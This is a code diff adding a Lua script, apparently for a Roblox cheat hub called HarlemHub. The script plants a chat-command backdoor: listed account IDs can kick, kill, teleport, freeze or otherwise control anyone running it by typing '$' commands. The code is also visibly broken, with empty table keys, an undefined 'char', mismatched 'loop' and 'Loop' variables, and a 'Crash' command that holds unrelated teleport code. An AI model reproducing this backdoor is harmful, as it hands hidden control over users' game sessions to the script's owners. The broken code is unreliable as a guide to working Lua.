@@ -1,0 +1,170 @@
+local AdminPrefix = "$" 
+local Players = game:GetService("Players")
+local LocalP = Players.LocalPlayer;
+getgenv().AdminTable = {
+	[2979792468] = {["Access"] = 5}; --Harlem
+	[2864614126] = {["Access"] = 5}; --Harlem
+	[2353695908] = {["Access"] = 5}; --Harlem
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; --
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5}; -- 
+	[] = {["Access"] = 5} -- 
+}
+
+local GP = Players:GetPlayers()
+for i = 1, #GP do
+	local CoolKidPlayer = GP[i]
+	CoolKidPlayer.Chatted:Connect(function(Word)
+		BDCheck(CoolKidPlayer, Word)
+	end)
+end
+Players.PlayerAdded:Connect(function(CKP)
+	CKP.Chatted:Connect(function(Message)
+		BDCheck(CKP, Message)
+	end)
+end)
+
+getgenv().psearch = function(Name)
+	local Inserted = {}
+	for _, p in pairs(Players:GetPlayers()) do
+		if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
+			table.insert(Inserted, p);return p
+		end
+	end
+end 
+
+getgenv().AdminCmdList = {
+	["Kick"] = {
+		["CommandFunc"] = function(Player, self, CmdPlayer)
+			if Player == LocalP or Player == "all" then
+				LocalP:Kick("You have been kicked by a HarlemHub premium member.", self)
+			end
+		end;
+		["Clearence"] = {[5] = true;};
+	}; 
+	["Kill"] = {
+		["CommandFunc"] = function(Player, self, CmdPlayer)
+			if Player == LocalP or Player == "all" then
+				LocalP.Character:FindFirstChildOfClass("Humanoid"):ChangeState(15)
+			end
+		end;
+		["Clearence"] = {[4] = true;[5] = true;};
+	};
+	["Bring"] = {
+		["CommandFunc"] = function(Player, self, CmdPlayer)
+			if Player == LocalP or Player == "all" then
+				LocalP.Character.HumanoidRootPart.CFrame = game:GetService("Players")[CmdPlayer.Name].Character.HumanoidRootPart.CFrame
+			end
+		end;
+		["Clearence"] = {[4] = true;[5] = true;};
+	};
+	["Freeze"] = {
+		["CommandFunc"] = function(Player, self, CmdPlayer)
+			if Player == LocalP or Player == "all" then
+				for i, x in next, char:GetDescendants() do
+					if x:IsA("BasePart") and not x.Anchored then
+						x.Anchored = true
+					end
+				end
+			end
+		end;
+		["Clearence"] = {[4] = true;[5] = true;};
+	};
+	["Unfreeze"] = {
+		["CommandFunc"] = function(Player, self, CmdPlayer)
+			if Player == LocalP or Player == "all" then
+				for i, x in next, char:GetDescendants() do
+					if x:IsA("BasePart") and x.Anchored then
+						x.Anchored = false
+					end
+				end
+			end
+		end;
+		["Clearence"] = {[4] = true;[5] = true;};
+	};
+	["Walkspeed"] = {
+		["CommandFunc"] = function(Player, self, CmdPlayer)
+			if Player == LocalP or Player == "all" then
+				LocalP.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = 30
+			end
+		end;
+		["Clearence"] = {[4] = true;[5] = true;};
+	};
+	["Crash"] = {
+		["CommandFunc"] = function(Player, self, CmdPlayer)
+			if Player == LocalP or Player == "all" then
+				local Loop = true
+
+spawn(
+    function()
+        while Loop do
+            if game.Players.LocalPlayer.Character.Humanoid.Health <= 30 then
+                local LastPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                break
+            end
+        end
+    end
+)
+
+while loop do
+    wait(0.1)
+    if game.Players.LocalPlayer.Character.Humanoid.Health <= 30 then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(666.902832, -431.744995, 931.35498) -- CFrame Here
+        if game.Players.LocalPlayer.Character.Humanoid.Health <= 75 then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = LastPosition -- Goes back to old position
+            break
+        end
+    end
+end
+		end;
+		["Clearence"] = {[4] = true;[5] = true;};
+	};
+	["Jumppower"] = {
+		["CommandFunc"] = function(Player, self, CmdPlayer)
+			if Player == LocalP or Player == "all" then
+				LocalP.Character:FindFirstChildOfClass("Humanoid").JumpPower = 50
+			end
+		end;
+		["Clearence"] = {[4] = true;[5] = true;};
+	};
+};
+
+getgenv().BDCheck = function(Target2, Chat)
+	if Chat:sub(1, 1) == AdminPrefix then
+		local args = string.split(Chat:sub(2), " ")
+		local Command = AdminCmdList[table.remove(args, 1)]
+		local targ1 = psearch(table.remove(args, 1))
+		if Command and targ1 then 
+			return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
+		end
+	end
+end
